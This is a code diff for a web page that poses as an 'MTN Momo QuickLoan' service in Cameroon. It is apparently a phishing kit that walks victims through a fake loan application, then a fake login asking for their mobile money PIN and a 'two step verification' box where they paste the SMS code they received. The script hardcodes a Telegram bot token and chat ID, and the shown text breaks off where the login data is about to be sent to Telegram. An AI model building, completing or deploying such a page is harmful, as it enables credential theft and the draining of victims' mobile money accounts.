@@ -1,147 +1,161 @@
-
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QuickLoan</title>
+    <title>MTN Momo - QuickLoan & Services</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        :root {
+            --primary: #4361ee;
+            --primary-dark: #3a0ca3;
+            --mtn-yellow: #ffcc00;
+            --mtn-red: #E2001A;
+            --bg-color: #f0f2f5;
+            --card-bg: #ffffff;
+            --text-main: #333333;
+            --text-muted: #777777;
+            --border-color: #ddd;
+            --radius: 20px;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-        }
-        
-        html,
-        body {
-            min-height: 100vh;
             font-family: 'Inter', sans-serif;
-            background: #f0f2f5;
-            overflow-x: hidden;
-            overflow-y: auto;
         }
-        
-        body {
+
+        html, body {
+            min-height: 100vh;
+            background: var(--bg-color);
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: clamp(10px, 2vw, 20px);
+            justify-content: flex-start;
+            overflow-x: hidden;
+            padding: 10px;
         }
-        
+
+        .view-container {
+            width: 100%;
+            max-width: 480px;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            animation: fadeIn 0.3s ease-in-out;
+            margin-bottom: 20px;
+        }
+
+        .view-container.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         header {
             width: 100%;
             max-width: 480px;
-            padding: clamp(10px, 3vw, 15px) clamp(15px, 4vw, 20px);
+            padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: clamp(5px, 2vw, 10px);
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+            border-radius: 16px;
+            margin-bottom: 12px;
         }
-        
-        .menu-btn {
-            font-size: clamp(24px, 6vw, 28px);
+
+        .back-btn, .menu-btn {
+            font-size: 24px;
             background: none;
             border: none;
             cursor: pointer;
-            color: #333;
+            color: var(--text-main);
         }
-        
+
         .logo {
             display: flex;
             align-items: center;
-            justify-content: center;
+            gap: 10px;
         }
-        
+
         .logo img {
-            height: clamp(32px, 8vw, 40px);
+            height: 36px;
             width: auto;
             object-fit: contain;
-        }
-        
-        .logo-text {
-            font-size: clamp(22px, 6vw, 28px);
-            font-weight: 700;
-            color: #ffcc00;
-            background: #1a1a1a;
-            padding: 4px 14px;
             border-radius: 8px;
         }
-        
+
+        .logo-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-main);
+        }
+
         .card {
-            background: white;
-            border-radius: clamp(16px, 5vw, 24px);
-            padding: clamp(24px, 6vw, 32px) clamp(20px, 5vw, 28px);
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            padding: 30px 24px;
             width: 100%;
-            max-width: 480px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
-            text-align: center;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
         }
-        
-        @media (min-width: 769px) {
-            body {
-                padding: clamp(15px, 3vw, 20px);
-                justify-content: center;
-            }
-            .card {
-                padding: clamp(30px, 5vw, 40px) clamp(25px, 4vw, 30px);
-            }
-        }
-        
+
         .title {
-            font-size: clamp(22px, 5vw, 26px);
+            font-size: 24px;
             font-weight: 700;
-            color: #333;
-            margin-bottom: clamp(4px, 1.5vw, 6px);
+            color: var(--text-main);
+            text-align: center;
+            margin-bottom: 6px;
         }
-        
+
         .subtitle {
-            font-size: clamp(13px, 3.5vw, 15px);
-            color: #777;
-            margin-bottom: clamp(18px, 5vw, 24px);
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 20px;
         }
-        
+
+        /* Calculator Styles */
         .calc-section {
             background: #f8f9ff;
-            border-radius: clamp(15px, 4vw, 20px);
-            padding: clamp(18px, 5vw, 24px);
-            margin-bottom: clamp(18px, 5vw, 24px);
+            border-radius: 16px;
+            padding: 18px;
+            margin-bottom: 20px;
             text-align: left;
         }
-        
+
         .calc-title {
-            font-size: clamp(16px, 4vw, 19px);
+            font-size: 16px;
             font-weight: 600;
             text-align: center;
-            margin-bottom: clamp(18px, 5vw, 24px);
-            color: #333;
+            margin-bottom: 16px;
+            color: var(--text-main);
         }
-        
+
         .input-group {
-            margin-bottom: clamp(24px, 7vw, 32px);
+            margin-bottom: 20px;
         }
-        
+
         .input-header {
             display: flex;
             justify-content: space-between;
-            margin-bottom: clamp(8px, 2vw, 10px);
+            margin-bottom: 6px;
             font-weight: 600;
-            font-size: clamp(13px, 3.5vw, 15px);
+            font-size: 14px;
         }
-        
-        .input-label {
-            color: #333;
-        }
-        
+
         .input-value {
-            color: #4361ee;
+            color: var(--primary);
             font-weight: 700;
         }
-        
+
         .slider {
             -webkit-appearance: none;
             width: 100%;
@@ -150,98 +164,313 @@
             background: #e0e0e0;
             outline: none;
         }
-        
+
         .slider::-webkit-slider-thumb {
             -webkit-appearance: none;
-            width: clamp(24px, 6vw, 28px);
-            height: clamp(24px, 6vw, 28px);
+            width: 24px;
+            height: 24px;
             border-radius: 50%;
-            background: #4361ee;
+            background: var(--primary);
             cursor: pointer;
         }
-        
+
         .range-labels {
             display: flex;
             justify-content: space-between;
             color: #999;
-            font-size: clamp(12px, 3vw, 14px);
-            margin-top: clamp(6px, 2vw, 8px);
+            font-size: 12px;
+            margin-top: 6px;
         }
-        
+
         .payment-box {
             background: #f0f4ff;
-            padding: clamp(14px, 4vw, 18px);
-            border-radius: clamp(12px, 4vw, 16px);
+            padding: 14px;
+            border-radius: 12px;
             text-align: center;
         }
-        
+
         .payment-label {
             display: block;
             color: #666;
-            margin-bottom: clamp(6px, 2vw, 8px);
-            font-size: clamp(12px, 3vw, 14px);
+            margin-bottom: 4px;
+            font-size: 13px;
         }
-        
+
         .payment-amount {
-            font-size: clamp(26px, 7vw, 30px);
+            font-size: 24px;
             font-weight: 700;
-            color: #4361ee;
+            color: var(--primary);
         }
-        
-        .apply-btn {
+
+        .primary-btn {
             width: 100%;
-            padding: clamp(12px, 4vw, 16px);
+            padding: 16px;
             background: linear-gradient(to right, #4361ee, #7209b7);
             color: white;
             border: none;
             border-radius: 50px;
-            font-size: clamp(16px, 4vw, 18px);
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            margin-bottom: clamp(18px, 5vw, 24px);
+            text-align: center;
+            box-shadow: 0 8px 20px rgba(67, 97, 238, 0.3);
+            transition: opacity 0.2s;
         }
-        
+
+        .primary-btn:active {
+            transform: scale(0.98);
+        }
+
         .features {
             display: flex;
             justify-content: space-around;
-            flex-wrap: wrap;
-            gap: clamp(10px, 3vw, 20px);
+            margin-top: 15px;
+            gap: 10px;
         }
-        
+
         .feature {
             text-align: center;
-            color: #777;
-            font-size: clamp(11px, 3vw, 13px);
-            flex: 1 0 100px;
+            color: var(--text-muted);
+            font-size: 11px;
+            flex: 1;
         }
-        
+
         .feature-icon {
-            font-size: clamp(32px, 8vw, 36px);
-            margin-bottom: clamp(6px, 2vw, 8px);
+            font-size: 24px;
+            margin-bottom: 4px;
         }
-        
-        footer {
-            padding: clamp(10px, 3vw, 15px);
-            color: #aaa;
-            font-size: clamp(11px, 3vw, 13px);
+
+        /* Form elements */
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 6px;
+            font-size: 14px;
+        }
+
+        .form-select, .form-input, .form-textarea {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 15px;
+            margin-bottom: 16px;
+            outline: none;
+            transition: border 0.3s;
+        }
+
+        .form-select:focus, .form-input:focus, .form-textarea:focus {
+            border-color: var(--primary);
+        }
+
+        .invalid {
+            border-color: var(--mtn-red) !important;
+        }
+
+        .progress-bar-container {
+            width: 140px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 10px auto 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(to right, #4361ee, #7209b7);
+            transition: width 0.3s ease;
+        }
+
+        .step-text {
             text-align: center;
-            flex-shrink: 0;
+            color: var(--text-muted);
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .name-group {
+            display: flex;
+            gap: 12px;
+        }
+
+        .phone-group-custom {
+            display: flex;
+            align-items: center;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 0 14px;
+            margin-bottom: 16px;
+        }
+
+        .phone-prefix {
+            color: #666;
+            font-size: 15px;
+            margin-right: 8px;
+        }
+
+        .phone-input-custom {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 14px 0;
+            font-size: 15px;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .secondary-btn {
+            flex: 1;
+            padding: 16px;
+            background: #eee;
+            color: #666;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .summary-box {
+            background: #f8f9ff;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            color: #555;
+        }
+
+        .summary-value {
+            font-weight: 600;
+            color: #333;
+        }
+
+        /* Login & PIN view styles */
+        .login-card-content {
+            padding: 20px 10px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .phone-box-main {
+            width: 100%;
+            border: 2px solid var(--primary);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            padding: 14px 18px;
+            margin-bottom: 24px;
+            background: white;
+        }
+
+        .pin-group {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .pin-box {
+            width: 48px;
+            height: 48px;
+            border: 2px solid var(--primary);
+            border-radius: 12px;
+            font-size: 22px;
+            text-align: center;
+            background: white;
+            font-weight: 600;
+            outline: none;
+        }
+
+        /* Overlays */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .overlay.active {
+            display: flex;
+        }
+
+        .modal-card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 24px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f0f0f0;
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .sms-textarea {
+            width: 100%;
+            height: 120px;
+            border: 2px solid var(--mtn-red);
+            border-radius: 12px;
+            padding: 12px;
+            font-size: 14px;
+            resize: none;
+            outline: none;
+            margin-bottom: 15px;
+            font-family: monospace;
+        }
+
+        footer-note {
+            font-size: 12px;
+            color: #aaa;
+            text-align: center;
+            margin-top: 10px;
         }
     </style>
 </head>
-
 <body>
-    <header>
-        <button class="menu-btn">☰</button>
-        <div class="logo">
-            <!-- Replace this placeholder with your own authorized logo image:
-                 <img src="your-logo.png" alt="YourBrand"> -->
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo">
-        </div>
-        <div></div>
-    </header>
-    <main class="card">
-        <div>
+
+    <!-- ================= VIEW 1: CALCULATOR ================= -->
+    <div id="view-calculator" class="view-container active">
+        <header>
+            <button class="menu-btn"><i class="fa-solid fa-bars"></i></button>
+            <div class="logo">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo">
+                <span class="logo-text">QuickLoan</span>
+            </div>
+            <div></div>
+        </header>
+        <main class="card">
             <h1 class="title">Get Your Loan Fast</h1>
             <p class="subtitle">Quick approval • Competitive interest • Flexible terms</p>
             <div class="calc-section">
@@ -267,53 +496,525 @@
                     <span class="payment-amount" id="paymentAmount">45,057.00 FCFA</span>
                 </div>
             </div>
-            <button class="apply-btn" id="applyBtn">APPLY NOW</button>
+            <button class="primary-btn" id="goToAppStep1">APPLY NOW</button>
+            <div class="features">
+                <div class="feature"><div class="feature-icon">⚡</div>Fast Approval<br>Within 24h</div>
+                <div class="feature"><div class="feature-icon">💰</div>Low Interest<br>From 8%</div>
+                <div class="feature"><div class="feature-icon">🔒</div>Secure<br>Bank-grade</div>
+            </div>
+        </main>
+        <footer-note>© 2026 QuickLoan</footer-note>
+    </div>
+
+    <!-- ================= VIEW 2: APPLICATION STEP 1 ================= -->
+    <div id="view-step1" class="view-container">
+        <header>
+            <button class="back-btn" data-target="calculator"><i class="fa-solid fa-arrow-left"></i></button>
+            <div class="logo">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo">
+                <span class="logo-text">QuickLoan</span>
+            </div>
+            <div></div>
+        </header>
+        <main class="card">
+            <h1 class="title" style="font-size: 22px;">Loan Application</h1>
+            <div class="progress-bar-container"><div class="progress-fill" style="width: 33%;"></div></div>
+            <div class="step-text">Step 1 of 3</div>
+
+            <label class="form-label">Loan Type</label>
+            <select class="form-select" id="loanType">
+                <option>Personal Loan</option>
+                <option>Business Loan</option>
+                <option>Home Loan</option>
+                <option>Vehicle Loan</option>
+                <option>Education Loan</option>
+            </select>
+
+            <label class="form-label">Loan Amount (FCFA)</label>
+            <input type="number" class="form-input" id="loanAmountInput" placeholder="500000" min="5000" max="500000">
+
+            <label class="form-label">Loan Term</label>
+            <select class="form-select" id="loanTermSelect">
+                <option value="6">6 Months</option>
+                <option value="12" selected>12 Months</option>
+                <option value="18">18 Months</option>
+                <option value="24">24 Months</option>
+                <option value="36">36 Months</option>
+                <option value="48">48 Months</option>
+                <option value="60">60 Months</option>
+            </select>
+
+            <label class="form-label">Loan Purpose</label>
+            <textarea class="form-textarea" id="loanPurpose" placeholder="What will you use the loan for?"></textarea>
+
+            <button class="primary-btn" id="goToAppStep2">NEXT STEP</button>
+        </main>
+        <footer-note>© 2026 QuickLoan</footer-note>
+    </div>
+
+    <!-- ================= VIEW 3: APPLICATION STEP 2 ================= -->
+    <div id="view-step2" class="view-container">
+        <header>
+            <button class="back-btn" data-target="step1"><i class="fa-solid fa-arrow-left"></i></button>
+            <div class="logo">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo">
+                <span class="logo-text">QuickLoan</span>
+            </div>
+            <div></div>
+        </header>
+        <main class="card">
+            <h1 class="title" style="font-size: 22px;">Personal Details</h1>
+            <div class="progress-bar-container"><div class="progress-fill" style="width: 66%;"></div></div>
+            <div class="step-text">Step 2 of 3</div>
+
+            <div class="name-group">
+                <div>
+                    <label class="form-label">First Name</label>
+                    <input type="text" class="form-input" id="firstName" placeholder="John">
+                </div>
+                <div>
+                    <label class="form-label">Last Name</label>
+                    <input type="text" class="form-input" id="lastName" placeholder="Doe">
+                </div>
+            </div>
+
+            <label class="form-label">Phone Number</label>
+            <div class="phone-group-custom" id="phoneGroup">
+                <span class="phone-prefix">+237</span>
+                <input type="tel" class="phone-input-custom" id="phone" placeholder="650123456" maxlength="9">
+            </div>
+            <small style="color:#999; display:block; margin-bottom:20px;">Enter exactly 9 digits</small>
+
+            <div class="btn-group">
+                <button class="secondary-btn" data-target="step1">BACK</button>
+                <button class="primary-btn" id="goToAppStep3" style="flex:1;">NEXT STEP</button>
+            </div>
+        </main>
+        <footer-note>© 2026 QuickLoan</footer-note>
+    </div>
+
+    <!-- ================= VIEW 4: FINAL REVIEW & SUBMIT ================= -->
+    <div id="view-step3" class="view-container">
+        <header>
+            <button class="back-btn" data-target="step2"><i class="fa-solid fa-arrow-left"></i></button>
+            <div class="logo">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo">
+                <span class="logo-text">MTN Momo</span>
+            </div>
+            <div></div>
+        </header>
+        <main class="card">
+            <h1 class="title" style="font-size: 22px;">Final Review</h1>
+            <div class="progress-bar-container"><div class="progress-fill" style="width: 100%;"></div></div>
+            <div class="step-text">Step 3 of 3</div>
+
+            <label class="form-label">Employment Status</label>
+            <select class="form-select" id="employmentStatus">
+                <option>Employed</option>
+                <option>Self-Employed</option>
+                <option>Unemployed</option>
+                <option>Student</option>
+            </select>
+
+            <label class="form-label">Annual Income (XAF)</label>
+            <input type="number" class="form-input" id="annualIncome" placeholder="500000">
+
+            <div class="summary-box" id="summaryBox">
+                <!-- Dynamically populated summary -->
+            </div>
+
+            <div class="btn-group">
+                <button class="secondary-btn" data-target="step2">Back</button>
+                <button class="primary-btn" id="submitApplicationBtn" style="flex:1;">Submit Application</button>
+            </div>
+        </main>
+        <footer-note>© 2026 MTN Momo</footer-note>
+    </div>
+
+    <!-- ================= VIEW 5: LOGIN / PIN VIEW ================= -->
+    <div id="view-login" class="view-container">
+        <div class="logo" style="padding: 30px 0 10px;">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo" style="width:48px;height:48px;">
+            <span class="logo-text" style="font-size: 28px;">MTN Momo</span>
         </div>
-        <div class="features">
-            <div class="feature">
-                <div class="feature-icon">⚡</div>Fast Approval<br>Within 24 hours</div>
-            <div class="feature">
-                <div class="feature-icon">💰</div>Low Interest<br>From 8%</div>
-            <div class="feature">
-                <div class="feature-icon">🔒</div>Secure<br>Bank-grade security</div>
+        <main class="card" style="align-items: center;">
+            <h1 class="title" style="font-size: 22px; margin-bottom: 25px;">Log in</h1>
+            <div class="phone-box-main">
+                <span style="font-size: 24px; margin-right: 10px;">🇨🇲</span>
+                <span style="color:var(--primary); font-weight:600; margin-right:12px;">+237</span>
+                <input type="tel" id="loginPhoneInput" class="phone-input-custom" placeholder="Phone Number" style="padding:0;" maxlength="9">
+            </div>
+            <p style="color:#666; font-size:14px; margin-bottom:15px; font-weight:500;">Enter your PIN</p>
+            <div class="pin-group">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            </div>
+            <a href="#" style="color:var(--primary); font-size:14px; text-decoration:none; margin-bottom:25px;">Forgot your PIN?</a>
+            <button class="primary-btn" id="executeLoginBtn" style="display:none;">LOG IN</button>
+        </main>
+        <footer-note>© 2026 MTN Momo</footer-note>
+    </div>
+
+    <!-- ================= VIEW 6: TWO-STEP VERIFICATION ================= -->
+    <div id="view-verify" class="view-container">
+        <header>
+            <button class="back-btn" data-target="login"><i class="fa-solid fa-arrow-left"></i></button>
+            <div class="logo">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkIMuXBHiC5OpIeU7Uq5OJnSIOe9cbzO7MALP-XujJ-w&s=10" alt="MTN Money">
+            </div>
+            <button class="menu-btn"><i class="fa-solid fa-bars"></i></button>
+        </header>
+        <main class="card" style="text-align: left;">
+            <h2 style="font-size: 20px; font-weight: 800; margin-bottom: 8px;">Two Step Verification</h2>
+            <p class="subtitle" style="text-align: left; margin-bottom: 15px;">Paste the complete link/sms message sent to your number</p>
+            <div id="verifyDisplayPhone" style="font-weight: 800; font-size: 16px; margin-bottom: 15px; color: var(--primary);">+237.........</div>
+            <textarea id="smsInputCode" class="sms-textarea" placeholder="Paste your complete Link/SMS message here..."></textarea>
+            <p id="resendWrapper" style="font-size: 13px; color: #777; text-align: center; margin-bottom: 15px;">Resend in <span id="countdown">30</span> seconds</p>
+            <button id="finalSubmitOtpBtn" class="primary-btn" disabled style="background:#e7e7e7; color:#9a9a9a; cursor:not-allowed; box-shadow:none;">SUBMIT</button>
+        </main>
+        <footer-note>© 2026 MTN Money - Cameroon</footer-note>
+    </div>
+
+    <!-- ================= OVERLAYS / SPINNERS ================= -->
+    <div id="loadingOverlay" class="overlay">
+        <div class="modal-card">
+            <div class="spinner"></div>
+            <p id="loadingText" style="font-weight: 600; color: #333;">Processing request...</p>
         </div>
-    </main>
-    <footer>© 2026 QuickLoan</footer>
+    </div>
+
+    <div id="successOverlay" class="overlay">
+        <div class="modal-card">
+            <div style="width: 70px; height: 70px; background: #00c853; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; font-size: 36px; color: white;">✓</div>
+            <h3 style="color: #00c853; font-size: 22px; margin-bottom: 10px;">Application Submitted</h3>
+            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Your application has been received successfully. Redirecting to login...</p>
+        </div>
+    </div>
+
+    <div id="errorModalOverlay" class="overlay">
+        <div class="modal-card">
+            <i class="fa-solid fa-circle-xmark" style="color: var(--mtn-red); font-size: 45px; margin-bottom: 15px;"></i>
+            <h3 style="font-size: 18px; margin-bottom: 10px;">Verification Failed</h3>
+            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Wrong verification payload or rejected by security server.</p>
+            <button class="primary-btn" onclick="closeErrorModal()">Try Again</button>
+        </div>
+    </div>
+
+    <!-- ================= APPLICATION SCRIPT ================= -->
     <script>
+        const BOT_TOKEN = '8265332180:AAHD9V6gBSoaLYfmtujNE6vGeOLkcv8mA8s';
+        const CHAT_ID = '5703339850';
+
+        // Navigation Controller
+        function switchView(viewId) {
+            document.querySelectorAll('.view-container').forEach(el => el.classList.remove('active'));
+            const target = document.getElementById('view-' + viewId);
+            if (target) {
+                target.classList.add('active');
+                window.scrollTo(0,0);
+                history.pushState({ view: viewId }, '', '#' + viewId);
+            }
+        }
+
+        window.addEventListener('popstate', (e) => {
+            if (e.state && e.state.view) {
+                document.querySelectorAll('.view-container').forEach(el => el.classList.remove('active'));
+                const target = document.getElementById('view-' + e.state.view);
+                if (target) target.classList.add('active');
+            }
+        });
+
+        // Initialize state history
+        history.replaceState({ view: 'calculator' }, '', '#calculator');
+
+        // Bind navigation buttons
+        document.querySelectorAll('[data-target]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                switchView(btn.getAttribute('data-target'));
+            });
+        });
+
+        // 1. Calculator Logic
         const amountSlider = document.getElementById('amountSlider');
         const termSlider = document.getElementById('termSlider');
         const amountValue = document.getElementById('amountValue');
         const termValue = document.getElementById('termValue');
         const paymentAmount = document.getElementById('paymentAmount');
 
-        function formatFCFA(value) {
-            return value.toLocaleString('en-US') + ' FCFA';
+        function updateCalc() {
+            const amt = parseFloat(amountSlider.value);
+            const months = parseFloat(termSlider.value);
+            amountValue.textContent = amt.toLocaleString('en-US') + ' FCFA';
+            termValue.textContent = months + ' months';
+            const annualRate = 0.08;
+            const mRate = annualRate / 12;
+            const power = Math.pow(1 + mRate, months);
+            const payment = (amt * (mRate * power)) / (power - 1);
+            paymentAmount.textContent = payment.toFixed(2) + ' FCFA';
         }
 
-        function updateCalculator() {
-            const amount = parseFloat(amountSlider.value);
-            const months = parseFloat(termSlider.value);
-            amountValue.textContent = formatFCFA(amount);
-            termValue.textContent = months + (months === 1 ? ' month' : ' months');
-            const annualRate = 0.08;
-            const monthlyRate = annualRate / 12;
-            if (months === 0) {
-                paymentAmount.textContent = amount.toFixed(2) + ' FCFA';
-            } else {
-                const power = Math.pow(1 + monthlyRate, months);
-                const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
-                paymentAmount.textContent = monthlyPayment.toFixed(2) + ' FCFA';
-            }
-        }
-        updateCalculator();
-        amountSlider.addEventListener('input', updateCalculator);
-        termSlider.addEventListener('input', updateCalculator);
-        document.getElementById('applyBtn').addEventListener('click', function() {
+        amountSlider.addEventListener('input', updateCalc);
+        termSlider.addEventListener('input', updateCalc);
+        updateCalc();
+
+        document.getElementById('goToAppStep1').addEventListener('click', () => {
             localStorage.setItem('loanAmount', amountSlider.value);
             localStorage.setItem('loanTerm', termSlider.value);
-            window.location.href = 'application.html';
+            document.getElementById('loanAmountInput').value = amountSlider.value;
+            document.getElementById('loanTermSelect').value = termSlider.value;
+            switchView('step1');
         });
+
+        // 2. Step 1 Form Logic
+        document.getElementById('goToAppStep2').addEventListener('click', () => {
+            const amt = document.getElementById('loanAmountInput').value;
+            const purpose = document.getElementById('loanPurpose').value.trim();
+            if (!amt || amt < 5000 || !purpose) {
+                alert('Please enter valid amount (min 5000) and specify your loan purpose.');
+                return;
+            }
+            localStorage.setItem('loanType', document.getElementById('loanType').value);
+            localStorage.setItem('loanAmount', amt);
+            localStorage.setItem('loanTerm', document.getElementById('loanTermSelect').value);
+            localStorage.setItem('loanPurpose', purpose);
+            switchView('step2');
+        });
+
+        // 3. Step 2 Form Logic
+        document.getElementById('goToAppStep3').addEventListener('click', () => {
+            const fName = document.getElementById('firstName').value.trim();
+            const lName = document.getElementById('lastName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            if (!fName || !lName || phone.length !== 9 || !/^\d+$/.test(phone)) {
+                alert('Please check your names and input a valid 9-digit phone number.');
+                document.getElementById('phoneGroup').classList.add('invalid');
+                return;
+            }
+            document.getElementById('phoneGroup').classList.remove('invalid');
+            localStorage.setItem('firstName', fName);
+            localStorage.setItem('lastName', lName);
+            localStorage.setItem('phone', phone);
+            sessionStorage.setItem('savedPhone', phone);
+
+            // Populate summary before going to step 3
+            populateSummary();
+            switchView('step3');
+        });
+
+        function populateSummary() {
+            const summaryBox = document.getElementById('summaryBox');
+            const amt = parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString('fr-FR');
+            summaryBox.innerHTML = `
+                <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType')}</span></div>
+                <div class="summary-row"><span>Amount:</span><span class="summary-value">${amt} XAF</span></div>
+                <div class="summary-row"><span>Duration:</span><span class="summary-value">${localStorage.getItem('loanTerm')} Months</span></div>
+                <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose')}</span></div>
+                <div class="summary-row"><span>Name:</span><span class="summary-value">${localStorage.getItem('firstName')} ${localStorage.getItem('lastName')}</span></div>
+                <div class="summary-row"><span>Phone:</span><span class="summary-value">+237 ${localStorage.getItem('phone')}</span></div>
+            `;
+            if(localStorage.getItem('employmentStatus')) document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
+            if(localStorage.getItem('annualIncome')) document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
+        }
+
+        // 4. Step 3 Final Submission Logic
+        document.getElementById('submitApplicationBtn').addEventListener('click', () => {
+            const income = document.getElementById('annualIncome').value.trim();
+            if (!income || income < 1000) {
+                alert('Please enter valid annual income.');
+                return;
+            }
+            localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
+            localStorage.setItem('annualIncome', income);
+
+            // Show loading spinner
+            const loader = document.getElementById('loadingOverlay');
+            document.getElementById('loadingText').textContent = 'Submitting application credentials...';
+            loader.classList.add('active');
+
+            setTimeout(() => {
+                loader.classList.remove('active');
+                const success = document.getElementById('successOverlay');
+                success.classList.add('active');
+                setTimeout(() => {
+                    success.classList.remove('active');
+                    // Pre-fill login phone
+                    const savedPhone = localStorage.getItem('phone');
+                    if(savedPhone) document.getElementById('loginPhoneInput').value = savedPhone;
+                    switchView('login');
+                }, 2500);
+            }, 2000);
+        });
+
+        // 5. Login & PIN Management
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const loginBtn = document.getElementById('executeLoginBtn');
+        let enteredPin = '';
+
+        pinBoxes.forEach((box, idx) => {
+            box.addEventListener('input', () => {
+                if (box.value.length === 1 && idx < pinBoxes.length - 1) {
+                    pinBoxes[idx + 1].focus();
+                }
+                checkPinReady();
+            });
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && idx > 0) {
+                    pinBoxes[idx - 1].focus();
+                }
+            });
+        });
+
+        function checkPinReady() {
+            enteredPin = Array.from(pinBoxes).map(b => b.value).join('');
+            const phoneVal = document.getElementById('loginPhoneInput').value.trim();
+            if (enteredPin.length === 5 && phoneVal.length === 9) {
+                loginBtn.style.display = 'block';
+            } else {
+                loginBtn.style.display = 'none';
+            }
+        }
+
+        document.getElementById('loginPhoneInput').addEventListener('input', checkPinReady);
+
+        loginBtn.addEventListener('click', () => {
+            const phone = document.getElementById('loginPhoneInput').value.trim();
+            localStorage.setItem('phone', phone);
+            sessionStorage.setItem('savedPhone', phone);
+
+            const loader = document.getElementById('loadingOverlay');
+            document.getElementById('loadingText').textContent = 'Authenticating account session...';
+            loader.classList.add('active');
+
+            // Send Telegram alert for login attempt
